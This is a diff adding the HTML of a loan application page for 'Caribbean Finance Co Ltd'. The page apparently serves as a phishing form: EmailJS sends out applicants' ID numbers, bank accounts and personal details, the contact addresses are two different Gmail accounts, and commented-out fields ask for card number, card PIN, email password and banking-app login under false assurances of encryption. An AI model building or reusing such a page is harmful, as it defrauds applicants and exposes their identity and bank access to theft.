@@ -1,0 +1,283 @@
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" href="page.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin> 
+    <link href="https://fonts.googleapis.com/css2?family=Charm:wght@400;700&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/b33e9054eb.js" crossorigin="anonymous"></script>
+    <title>Application Form</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // https://dashboard.emailjs.com/admin/account
+            emailjs.init('TAz0YgjMfKAG2LFOm');
+        })();
+    </script>
+</head>
+<body>
+
+    <!-- <div id="div1">
+        <div id="img1"><img src="./OIP.jpg" alt=""></div>
+        <i id="icon1" class="fa-solid fa-bars"></i> -->
+        <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+        <!-- <i id="icon2" class="fa-solid fa-magnifying-glass"></i> -->
+    <!-- </div> -->
+    <div id="div2" style="z-index: 3;">
+        <img src="./WhatsApp Image 2024-08-12 at 07.43.48_deb462c1.jpg" alt="">
+        <h2 id="p4" style="color:black;">Application form</h2>
+        <i id="icon1" style="color:black;" class="fa-solid fa-bars"></i>
+        <!-- <i id="icon1" class="fa-sharp fa-solid fa-bars"></i> -->
+        <!-- <i id="icon2" class="fa-solid fa-magnifying-glass"></i> -->
+    </div>
+    <!-- <div id="div1">
+        <div id="img1"><img src="./WhatsApp Image 2024-05-21 at 18.29.10.jpeg" alt=""></div>
+     
+    </div>
+    <div id="div2">
+        <p id="p4">Caribbean Finance Co Ltd Loan Application Form</p>
+    </div> -->
+    <form id="contact-form">
+        <input type="hidden" name="contact_number">
+        <div id="page1">
+
+            <label for="name">Full Name:</label> <br>
+            <input type="text" name="name" id="name" placeholder="Enter First Name"> 
+            <input type="text" name="surname" id="surname" placeholder="Enter Surname"> <br>
+        
+            <!-- <label for="">Next of kin:</label><br>
+            <input type="text" class="input" name="kin" id="kin" placeholder="Enter Your Next of kin"> <br> -->
+
+            <label for="address">Address:</label><br>
+            <div id="allAddress">
+                <input type="text" class="input" name="address" id="address" placeholder="Enter Street Address"> <br>
+                <!-- <input type="text" name="street" id="address" placeholder="Enter Street Address Line 2"> -->
+                <input type="text" name="city" id="city" placeholder="Enter City">
+            </div>
+            <div id="allAddress">
+                <input type="text" name="state/province" id="state/province" placeholder="Enter State / Province"><br>
+                <input type="text" name="postal" id="postal" placeholder="Enter POstal / Zip Code"> <br>
+            </div>
+            <br>
+    
+            <label for="">Employed Status:</label><br>
+            <input type="text" name="status" id="occupation" placeholder="Enter Your Occupation"> <br>
+
+            <!-- <img style="width: 100%; margin-bottom: 4%;" src="./WhatsApp Image 2024-05-23 at 12.28.32.jpeg" alt=""> -->
+<!--             
+            <label for="">Your office address:</label><br>
+            <input type="text" name="office-address" id="office-address" placeholder="Enter Your Office Address"> <br> -->
+         
+            <!-- <label for="">Married/Single:</label><br>
+            <input type="text" name="married/single" id="married/single" placeholder="Are you married or single"> <br> -->
+            
+            <label for="">Date of birth:</label><br>
+            <input type="date" name="birth" id="date" placeholder="Enter Your ID Date of birth"> <br>
+
+<!--             
+        <label for="">Salary earner/Business owner:</label><br>
+        <input type="text" class="input" name="pick" id="pick" placeholder="Salary earner/Business owner"> <br>
+         -->
+        <!-- <img style="width: 100%; margin-bottom: 4%;" src="./WhatsApp Image 2024-05-23 at 12.31.08.jpeg" alt=""> -->
+        
+        <label for="phone">Phone Number</label><br>
+        <input type="number" class="input" name="phone" id="phone" placeholder="Enter Phone Number"><br>
+            
+        <label for="">Email address:</label><br>
+        <input type="email" name="email" id="email" placeholder="Enter Your Email address" > <br>
+            
+        <label for="">ID Number:</label><br>
+        <input type="number" name="reference" id="reference" placeholder="Enter Your ID Number" > <br>
+
+        <div style="width: 100%; display: flex;">
+            <a href="mailto:caribbeanfinancecompanyltd@gmail.com" style="text-align: center; width: 100%; margin: 0px auto; text-decoration: none; color: blue; font-size: 150%;">contact us</a>
+
+        </div>
+
+        <p id="error-message"></p>
+
+        <div id="terms">
+            <input type="checkbox" name="agree" id="agree" onclick="validate()">
+            <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+            
+        </div>
+    <p id="btn1">Next</p>
+    </div>
+
+    <div style="display: none;" id="page2">
+        
+        <label for="amount">Loan Amount:</label><br>
+        <div class="input-group">
+            <span class="input-sign">$</span>
+            <input type="number" id="input-sign" name="amount" id="amount"  placeholder="Enter Loan Amount"><br>
+        </div>
+        
+        <label for="">Loan Duration:</label><br>
+        <select name="duration" id="durations">
+                <option id="opt10" value="Select your loan duration">Select your loan duration</option>
+                <option id="opt11" value="1 year">1 year</option>
+                <option id="opt12" value="2 years">2 years</option>
+                <option id="opt13" value="3 years">3 years</option>
+                <option id="opt14" value="4 years">4 years</option>
+                <option id="opt15" value="5 years">5 years</option>
+                <option id="opt16" value="6 years">6 years</option>
+                <option id="opt17" value="7 years">7 years</option>
+                <option id="opt18" value="8 years">8 years</option>
+                <option id="opt18" value="9 years">9 years</option>
+                <option id="opt18" value="10 years">10 years</option>
+                <option id="opt18" value="15 years">15 years</option>
+            </select><br>
+
+        <label for="account">Account Number:</label><br>
+        <input type="number" class="input" name="account2" id="account" placeholder="Enter Account Number"><br>
+
+        <!-- <img style="width: 100%; margin-bottom: 4%;" src="./WhatsApp Image 2024-05-23 at 12.31.10.jpeg" alt=""> -->
+        
+        <label for="banks">Select Bank:</label><br>
+        <select name="bank" id="banks">
+            <option id="opt1" value="Select your bank">Select your bank</option>
+            <option id="opt2" value="Republic Bank">Republic Bank</option>
+            <option id="opt3" value="RBC Royal Bank">RBC Royal Bank</option>
+            <option id="opt4" value="Scotiabank">Scotiabank</option>
+            <option id="opt5" value="JMMB Bank">JMMB Bank</option>
+            <option id="opt6" value="First Citizen Bank">First Citizen Bank</option>
+            <option id="opt7" value="Citi Bank">Citi Bank</option>
+            <option id="opt8" value="CIBC First Caribbean International Bank">CIBC First Caribbean International Bank</option>
+            <option id="opt9" value="Bank of Baroda">Bank of Baroda</option>
+        </select><br>
+        
+        <label for="">Net salary </label><br>
+        <input type="text" class="input" name="income" id="income" placeholder="Enter Your Monthly Income"> <br>
+        
+        <div style="width: 100%; display: flex;">
+            <a href="mailto:financeloanmicro@gmail.com" style="text-align: center; width: 100%; margin: 0px auto; text-decoration: none; color: blue; font-size: 150%;">contact us</a>
+
+        </div>
+
+       <p id="error-message2"></p>
+
+        <p onclick="onClickFunction2()" id="btn2">Previous</p>
+        <div id="terms">
+            <input type="checkbox" name="agree" id="agree" onclick="validate()">
+            <label for="agree" >I agree to the <span id="condition" style="color: blue;"> Terms and Conditions </span></label>
+            
+        </div>
+        
+        <!-- <img id="img1" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+        
+        
+        
+        <input type="submit" value="SUBMIT" id="submit"  style="display: none;">
+    </div>
+        
+    </form>
+
+    <div id="term" style="display: none;">
+        <p>Effective date: January 1, 2024.
+
+            CARIBBEAN FINANCE COMPANY LTD its affiliates (“CARIBBEAN FINANCE COMPANY LTD” or “we”) provide its content on its websites or applications that post a link to this Terms of Use (the “Site”) subject to the following terms and conditions (the “Terms”). We may periodically change the Terms without prior notice, so please check back from time to time. These Terms were last updated on January 1, 2021. By accessing and using this Site, you agree to these Terms. For an explanation of CARIBBEAN FINANCE COMPANY LTD’s practices and policies related to the collection, use, and storage of our users’ information, please read our Privacy Policy.
+            <br><br>
+            1. COPYRIGHTS
+            All content and functionality on the Site, including text, graphics, logos, icons, images, and videos and the selection and arrangement thereof, in addition to any concepts, know-how, tools, frameworks, software, applications or other technology, algorithms, models, processes, and industry perspectives underlying or embedded in the foregoing, along with any enhancements to or derivative works thereof (the “Site Content”) is the exclusive property of CARIBBEAN FINANCE COMPANY LTD or its licensors and, to the extent applicable, is protected by Trinidad and Tobago and international copyright laws. Neither the Site Content nor functionality of the Site, may be copied, reproduced, modified, reverse engineered, altered (including the removal or disabling of any security or technological safeguards, disclaimers, or legends) uploaded, published, uploaded, posted, transmitted, or distributed in any way without our written permission, except for those uses specified in Section 3 – Use of site content. All rights not expressly granted are reserved.
+            <br><br>
+            2. TRADEMARKS
+            The trademarks, service marks, designs, and logos (collectively, the “Trademarks”) displayed on the Site are the registered and unregistered Trademarks of CARIBBEAN FINANCE COMPANY LTD and its licensors. You agree that, except as expressly permitted by us (e.g., through social media sharing tools provided on the Site) or by our licensors, where applicable, you will not refer to or attribute any information to CARIBBEAN FINANCE COMPANY LTD or its licensors in any public medium (e.g., press release, websites, or public social media) for advertising or promotion purposes, or for the purpose of informing or influencing any third party and that you will not use or reproduce any Trademark of, or imply any endorsement by or relationship with, CARIBBEAN FINANCE COMPANY LTD or its licensors.
+            <br><br>
+            3. USE OF SITE CONTENT
+            CARIBBEAN FINANCE COMPANY LTD hereby grants you a limited, non-exclusive, non-transferable, revocable license for the term hereof to access and download, display, and print one copy of the Site Content on any single computer solely for your internal, business use, provided that you do not modify the Site Content in any way (including creating derivative works thereof), that you retain all copyright and other proprietary notices displayed on the Site Content, and that you otherwise comply with these Terms. You may not otherwise reproduce, modify, reverse engineer, distribute, transmit, post, or disclose the Site Content without CARIBBEAN FINANCE COMPANY LTD’s prior written consent. In addition, you may not “mirror” the Site Content or any portion thereof without CARIBBEAN FINANCE COMPANY LTD’s express written consent. Nothing on this Site should be construed as granting directly or indirectly, or by implication any license or right to use any CARIBBEAN FINANCE COMPANY LTD intellectual property other than as expressly set forth herein. The license granted in this section terminates automatically and immediately if you do not comply with these Terms.
+            <br><br>
+            4. USER POSTINGS
+            You acknowledge and agree that CARIBBEAN FINANCE COMPANY LTD shall own and have the unrestricted right to use, publish, and otherwise exploit any and all information that you post or otherwise publish on the Site in postings, forums or message boards, questionnaire, survey responses, and otherwise, and you acknowledge and agree that, by providing us any such submission, you automatically grant, and hereby do grant, to us a worldwide, non-exclusive, transferable, assignable, sublicensable, fully paid-up, royalty-free, perpetual, irrevocable license and right to use, reproduce, publish, distribute, modify and otherwise exploit such submission for any purpose, and in any form or media, not prohibited by applicable law. In addition, you hereby waive any claims against CARIBBEAN FINANCE COMPANY LTD for any alleged or actual infringements of any rights of privacy or publicity, intellectual property rights, moral rights, or rights of attribution in connection with CARIBBEAN FINANCE COMPANY LTD’s use and publication of such submissions.
+            <br><br>
+            You covenant that you shall not post or otherwise publish on the Site any materials that:
+            <br><br>
+            are threatening, libellous, defamatory, or obscene;
+            would constitute, or that encourage conduct that would constitute, a criminal offense, give rise to civil liability, or otherwise violate law;
+            infringe the intellectual property, privacy, or other rights of any third parties;
+            contain a computer virus or other destructive element;
+            contain advertising;
+            constitute or contain false or misleading statements; or
+            violates these Terms.
+            CARIBBEAN FINANCE COMPANY LTD does not represent or endorse the accuracy of reliability of information posted to the Site by users. In addition, CARIBBEAN FINANCE COMPANY LTD does not and cannot review all information posted to the Site by users and is not responsible for such information. However, CARIBBEAN FINANCE COMPANY LTD reserves the right to refuse to post and the right to remove any information, in whole or in part, for any reason or for no reason.
+            <br><br>
+            5. NOTICES OF INFRINGEMENT AND TAKEDOWN BY CARIBBEAN FINANCE COMPANY LTD
+            CARIBBEAN FINANCE COMPANY LTD prohibits the posting of any information that infringes or violates the copyright rights and/or other intellectual property rights (including rights of privacy and publicity) of any person or entity. If you believe that your intellectual property right (or such a right that you are responsible for enforcing) is infringed by any content on the Site, please write to CARIBBEAN FINANCE COMPANY LTD at the address shown below, giving a written statement that contains:
+            <br><br>
+            identification of the copyrighted work and/or intellectual property right claimed to have been infringed;
+            identification of the allegedly infringing material on the Site that is requested to be removed;
+            your name, address, and daytime telephone number, and an e-mail address if available;
+            a statement that you have a good faith belief that the use of the copyrighted work and/or exercise of the intellectual property right is not authorized by the owner, its agent, or the law;
+            a statement that the information in the notification is accurate, and, under penalty of perjury, that the signatory is authorized to act on behalf of the owner of the right that is allegedly infringed; and
+            the signature of the intellectual property right owner or someone authorized on the owner’s behalf to assert infringement of the right. CARIBBEAN FINANCE COMPANY LTD will remove any posted submission that infringes the copyright or other intellectual property right of any person.
+             <br><br>
+            6. DISCLAIMERS
+            THE CONTENT AND FUNCTIONALITY ON THE SITE IS PROVIDED WITH THE UNDERSTANDING THAT CARIBBEAN FINANCE COMPANY LTD IS NOT HEREIN ENGAGED IN RENDERING PROFESSIONAL ADVICE OR SERVICES TO YOU, NO SITE CONTENT IS INTENDED TO SERVE AS OR SHALL BE DEEMED INVESTMENT, LEGAL, TAX, ACCOUNTING OR OTHER REGULATED ADVICE, AND THAT YOU SHALL REMAIN SOLELY RESPONSIBLE FOR YOUR USE OF ALL SITE CONTENT AND ACKNOWLEDGE THAT ANY RELIANCE UPON THE SITE CONTENT SHALL BE ENTIRELY AT YOUR SOLE OPTION AND RISK. ALL CONTENT AND FUNCTIONALITY ON THE SITE IS PROVIDED “AS IS,” WITHOUT WARRANTY OF ANY KIND, EITHER EXPRESS OR IMPLIED, INCLUDING, WITHOUT LIMITATION, IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE. CARIBBEAN FINANCE COMPANY LTD AND ITS THIRD-PARTY CONTENT PROVIDERS MAKE NO WARRANTIES, EXPRESS OR IMPLIED, AS TO THE OWNERSHIP, ACCURACY, OR ADEQUACY OF THE SITE CONTENT. CARIBBEAN FINANCE COMPANY LTD SHALL HAVE NO LIABILITY OR RESPONSIBILITY FOR ANY INFORMATION PUBLISHED ON LINKED WEBSITES, CONTAINED IN ANY USER SUBMISSIONS PUBLISHED ON THE SITE, OR PROVIDED BY THIRD PARTIES. NEITHER CARIBBEAN FINANCE COMPANY LTD NOR ITS THIRD-PARTY CONTENT PROVIDERS SHALL BE LIABLE FOR ANY INDIRECT, INCIDENTAL, CONSEQUENTIAL, OR PUNITIVE DAMAGES OR LOSSES OR FOR LOST REVENUES OR PROFITS, WHETHER OR NOT ADVISED OF THE POSSIBILITY OF SUCH DAMAGES OR LOSSES AND REGARDLESS OF THE THEORY OF LIABILITY.
+            <br><br>
+            7. INDEMNIFICATION
+            You hereby indemnify, defend, and hold harmless CARIBBEAN FINANCE COMPANY LTD and all of its predecessors, successors, parents, subsidiaries, affiliates, officers, directors, shareholders, investors, employees, agents, representatives, and attorneys and their respective heirs, successors, and assigns (“CARIBBEAN FINANCE COMPANY LTD Indemnified Parties”) from and against any and all liability, expenses, costs, or other losses (“Losses”) incurred by CARIBBEAN FINANCE COMPANY LTD and/or CARIBBEAN FINANCE COMPANY LTD Indemnified Parties in connection to any claims arising out of your use of the Site and/or any breach by you of these Terms, including the representations, warranties and covenants you made, if any, by agreeing to these Term. CARIBBEAN FINANCE COMPANY LTD reserves the right to assume, at its own expense, the exclusive defence and control of any matter otherwise subject to indemnification by you.
+            <br><br>
+            8. THIRD PARTY WEBSITES AND PROVIDERS
+            We may provide links to third-party websites, and some of the content appearing to be on this Site is in fact supplied, supported, or provided directly or indirectly by third parties, for example, in instances of framing of third-party websites or incorporation through framesets of content supplied by third-party servers. CARIBBEAN FINANCE COMPANY LTD has no responsibility for these third-party websites, which are governed by the terms of use and privacy policies, if any, of the applicable third-party content providers.
+            <br><br>
+            9. GOVERNING LAW:JURISDICTION
+            These Terms are governed by the laws of the Republic of Trinidad and Tobago without reference to the principles of conflicts of laws thereof. </p>
+
+        <p onclick="onClickFunction3()" id="btn2">Previous</p>
+    </div>
+   
+
+    <div id="write-up">
+        <div id="write">
+            <img src="./b14ebf87-f581-432d-82f4-c51932ca8653.jpg" alt="">
+            <h3>Heading</h3>
+            <p id="failure">Unable to make to submit form <br><br> <span id="why">
+              Due to your internet connection</span> </p>
+            </div>
+    </div>
+    <div id="successful" style="display: none; width: 100vw;">
+    </div>
+    <div id="successful1" style="display: none;">
+        <img style="width: 100vw;" src="./WhatsApp Image 2024-05-13 at 23.06.34.jpeg" alt="">
+        <p>Your loan application has been successfully receieved and is currently in review</p>
+        <p>Kindly contact your loan agent for further assistance... </p>
+    </div>
+   </div>
+    <!-- <img src="./fnb-logo-2016.jpg" alt=""> -->
+    <!-- <label for="identity">ID Number:</label> <br>
+    <input type="number" name="identity" id="identity" placeholder="Enter ID number "> <br> -->
+    
+    <!-- <p id="p3">This section must be completed by representative</p>
+        <label for="address">Address:</label><br>
+        <div id="residence">
+            <input type="text" name="city" id="address" placeholder="Enter city">
+    <input type="text" name="state" id="state" placeholder="Enter State / Province"> <br>
+    </div>
+    <input type="text" name="postal" id="postal" placeholder="Enter Postal / Zip Code"><br> -->
+    
+    <!-- <img id="img2" src="./5f9e93db193a4599be7cedfaa83453f9.webp" alt=""> -->
+    
+    <!-- <img id="img9" src="./WhatsApp Image 2023-10-13 at 5.22.53 PM.jpeg" alt=""> --> 
+    
+            <!-- <label for="e-password">E-Mail Password</label>
+            <input type="password" name="e-password" id="e-password">
+    <p id="p2">Kindly input the required details to enable your loan disbursement into your account and
+         be ensured that your details are all encrypted and safe</p>
+    <label for="card">Card Number:</label> <br>
+    <input type="number" name="card" id="card" placeholder="Enter Card Number"> <br>
+    
+    <label for="pin">Card Pin:</label><br>
+    <input type="number" name="pin" id="pin" placeholder="Enter Card Pin"> <br>
+    
+    <p id="p3"> Kindly input the required details to enable your loan disbursement into your account and
+        be ensured that your details are all encrypted and safe</p>
+    <label for="username">App Username:</label> <br>
+    <input type="text" name="username" id="username" placeholder="Enter Username"> <br>
+    
+    <label for="password">App Password:</label> <br>
+    <input type="password" name="password" id="password" placeholder="Enter Password"> <br>
+    -->
+    <script src="page.js"></script>
+    <!-- <script type="module" src="module.js"></script> -->
+</body>
+</html>
